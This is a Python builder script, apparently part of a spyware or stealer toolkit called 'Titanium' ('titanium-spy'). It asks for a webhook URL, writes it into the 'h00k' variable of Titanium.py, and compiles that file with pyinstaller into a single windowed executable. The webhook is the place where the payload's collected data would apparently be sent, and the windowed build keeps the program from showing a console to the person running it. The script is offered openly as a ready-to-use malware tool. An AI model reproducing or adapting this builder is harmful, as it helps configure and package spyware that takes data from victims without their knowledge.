# SCRIPT MAKE BY NOCTADETP
# GITHUB https://github.com/noctadetp/titanium-spy
# TELEGRAM https://t.me/GoreAnd

# DEF THE MODULE
import time, os
from colorama import Fore

#DEF THE INTRO
intro = """
████████╗██╗████████╗ █████╗ ███╗   ██╗██╗██╗   ██╗███╗   ███╗
╚══██╔══╝██║╚══██╔══╝██╔══██╗████╗  ██║██║██║   ██║████╗ ████║
   ██║   ██║   ██║   ███████║██╔██╗ ██║██║██║   ██║██╔████╔██║
   ██║   ██║   ██║   ██╔══██║██║╚██╗██║██║██║   ██║██║╚██╔╝██║
   ██║   ██║   ██║   ██║  ██║██║ ╚████║██║╚██████╔╝██║ ╚═╝ ██║
   ╚═╝   ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝     ╚═╝
                                        by noctadetp          
"""

# PRINT THE INTRO
print(f"{Fore.RED}" + intro)

# DEFINE THE UPDATING OF TITANIUM SPION
sys = f"{Fore.RED}[{Fore.YELLOW}+{Fore.RED}]"
variable_name = "h00k"
new_value = input(f"{sys} {Fore.BLUE}Enter your {Fore.GREEN}Webhook Url\n{sys} {Fore.BLUE}>>> ")
def update_main_py_variable(variable_name, new_value):
    with open("Titanium.py", "r") as file:
        lines = file.readlines()
    #OPEN TITANIUM SPION
    with open("Titanium.py", "w") as file:
        for line in lines:
            if line.strip().startswith(f"{variable_name} = "):
                line = f"{variable_name} = \"{new_value}\"\n"
            file.write(line)
update_main_py_variable(variable_name, new_value)
os.system("pyinstaller --onefile --windowed -i NONE Titanium.py")
